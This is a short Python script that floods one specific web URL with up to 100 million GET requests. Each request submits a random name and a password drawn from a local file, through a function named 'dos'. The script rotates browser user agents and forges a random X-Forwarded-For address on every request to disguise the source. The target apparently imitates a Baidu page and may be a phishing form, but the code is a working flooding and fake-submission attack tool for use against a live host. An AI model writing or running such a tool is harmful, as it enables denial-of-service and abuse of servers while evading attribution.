#coding=utf8
import requests
import random
from concurrent import futures
import gevent
from gevent.threadpool import ThreadPool
class GeventThread(object):
  """使用异步方式"""
  def __init__(self,threads=10):
    self.Queue   = []
    self.threads = threads
    self.timeout = 10
    self.__FLAG  = True   #stop
    self.__STAT  = False  #pause
  def recv(self,*args,**kw):
    self.handler(*args,**kw)
  def run(self):
    if self.Queue and self.handler:
      self.__FLAG  = True
      self.__STAT  = False
      pool = ThreadPool(self.threads)
      Queue = iter(self.Queue)
      while self.__FLAG:
        if self.__STAT:
          time.sleep(1)
          continue
        try:
          data = next(Queue)
          pool.spawn(self.recv, data)
        except StopIteration:
          self.__FLAG = False
          break
        gevent.wait(timeout=self.timeout)
  def stop(self):
    self.__FLAG = False
    self.__STAT = False
  def pause(self):
    self.__STAT = not self.__STAT
  def setup(self,**kwargs):
    for k,v in kwargs.items():
      setattr(self,k,v)

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0',
    'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533+ (KHTML, like Gecko) Element Browser 5.0',
    'IBM WebExplorer /v0.94', 'Galaxy/1.0 [en] (Mac OS X 10.5.6; U; en)',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
    'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
    'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; TheWorld)']
i=0
f=open('p','r')
l=f.readlines()
def dos(i):
    try:
        h = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/sharpp,*/*;q=0.8',
        'User-Agent': random.choice(USER_AGENTS),
        'Accept-Encoding': 'gzip,deflate',
        'Accept-Language': 'zh-CN,en-US;q=0.8',
        'Cookie': 'PHPSESSID=pfm3j5mjuf72m39igalmr4st55l9d6j5',
        'Connection': 'keep-live',
        'X-Forwarded-For': '%s.%s.%s.%s'%(random.randint(1,255),random.randint(1,255),random.randint(1,255),random.randint(1,255))
        }
        url = "http://www.www.lulvqi.cn/soft.baidu.com/kj/?submit=&name=%s&pass=%s"%(
            random.randint(11111111,2000000000),
            random.choice(l))
        #print(url)
        req = requests.get(url,headers=h)
        print(req.status_code,i)

    except Exception as e:
        print(e)


a=GeventThread(1)
a.setup(
    Queue = range(100000000),
    handler = dos)
a.run()
